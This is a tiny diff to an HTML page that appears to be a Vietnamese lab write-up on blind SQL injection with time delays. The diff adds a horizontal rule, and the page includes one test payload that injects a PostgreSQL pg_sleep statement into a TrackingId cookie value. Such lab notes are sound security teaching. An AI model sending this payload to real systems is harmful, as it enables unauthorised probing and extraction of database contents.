@@ -1,5 +1,5 @@
 <h1>Blind SQL injection with time delays and information retrieval</h1>
-
+<hr>
 <h2>1. Kiểm tra bằng payload đơn giản</h2>
 <p><b>Payload kiểm tra TRUE</b></p>
 <pre>TrackingId=xyz'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</pre>
